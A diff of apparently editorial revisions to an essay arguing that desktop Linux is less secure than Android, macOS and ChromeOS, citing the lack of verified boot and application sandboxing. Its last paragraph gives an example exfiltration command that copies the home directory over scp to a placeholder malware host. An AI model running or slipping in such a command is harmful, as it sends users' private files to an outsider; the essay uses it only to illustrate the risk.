@@ -23,17 +23,17 @@ Linux servers are lighter than Desktop Linux systems by orders of magnitude, wit
 
 ## Linux Hardening Myths
 
-There is a common claim in response to Madaidan that Linux is only insecure by default, and that an experienced user can make it the most secure operating system out there, surpassing the likes of macOS or ChromeOS. Unfortunately, this is wishful thinking. There is no amount of hardening that one can reasonably apply as a user to fix up the inherent issues with Linux.
+There is a common claim in response to Madaidan that Linux is only insecure by default, and that an experienced user can make it the most secure operating system out there, surpassing the likes of macOS or ChromeOS. Unfortunately, this is wishful thinking. There is no amount of hardening that one can reasonably apply as a user to shore up the inherent issues with Linux.
 
 ### Lack of verified boot
 
-macOS, ChromeOS, and Android have a clear distinction between the system and user installed application. In over simplified terms, the system volume is signed by the OS vendor, and the firmware and boot loader works to make sure that said volume has the authorized signature. The operating system itself is immutable, and nothing the user does will need or be allowed to tamper with the system volume.
+Android, macOS, and ChromeOS have a clear distinction between the system and user installed applications. In oversimplified terms, the system volume is signed by the OS vendor, and the firmware and boot loader works to make sure that said volume has the authorized signature. The operating system itself is immutable, and nothing the user does will need or be allowed to tamper with the system volume.
 
-On Linux, there is no such clear distinction between the system and user installed applications. Linux distributions are a bunch of packages put together to make a system that works, and thus every package is treated as part of said system. The end result is that binaries, regardless of whether they are vital for the system to function or just an extra application, are thrown into the same directories as each other (namely `/usr/bin` and `/usr/local/bin`). This makes it impossible for an end user to setup a verification mechanism to verify the integrity of "the system", as said "system" is not clearly defined in the first place.
+Meanwhile, on Linux, there is **no** clear distinction between the system and user installed applications. Linux distributions are a bunch of packages put together to make a system that works, and thus every package is treated as part of said system. The end result is that binaries, regardless of whether they are vital for the system to function or just an extra application, are thrown into the same directories as each other (namely `/usr/bin` and `/usr/local/bin`). This makes it impossible for an end user to setup a verification mechanism to verify the integrity of "the system", as said "system" is not clearly defined in the first place.
 
 ### Lack of application sandboxing
 
-Operating systems like Android and ChromeOS have full system mandatory access control, every process from the init process is strictly confined. Regardless of which application you install or how you install them, they have to play by the rules of an untrusted SELinux domain and are only able to utilize unprivileged APIs.
+Operating systems like Android and ChromeOS have full system mandatory access control; that is, every process from the init process is strictly confined. Regardless of which application you install or how you install them, they have to play by the rules of an untrusted SELinux domain and are only able to utilize unprivileged APIs.
 
 Even on macOS, where the application sandbox is opt-in for developers, there is still a permission control system (TCC) for unprivileged applications. Apps run by the user do not have unrestricted access to their microphone, webcam, keystrokes, sensitive documents, and so on.
 
@@ -53,6 +53,6 @@ Something being open source does not imply that it is inherently private, secure
 
 **Security by irrelevance does not work**. Just because there are fewer users of your favorite operating system does not make it any safer. 
 
-Ask yourself this: Would you ditch Windows for ReactOS considering that it is a lot less popular and is less targeted? Likewise, would you ditch Linux desktop when it becomes the mainstream solution for the BSDs or some niche operating systems just because they are less popular?
+Ask yourself this: Would you ditch Windows for ReactOS because it is a lot less popular and is less targeted? Likewise, would you ditch Linux desktop when it becomes the mainstream solution for the BSDs or some niche operating systems just because they are less popular?
 
 Malware for Linux does exist, and it is not hard to make. It can be something as trivial as a shell script or binary executing `scp -r ~/ malware@xx.xx.xx.xx:/data`. Due to the lack of application sandboxing or an application permission model, your computer can be compromised the moment you execute a malicious binary, shell script, or install script with or without root and with or without an exploit. This is, of course, not to discount the fact that many exploits do exist on Linux just like on any other operating systems as well.
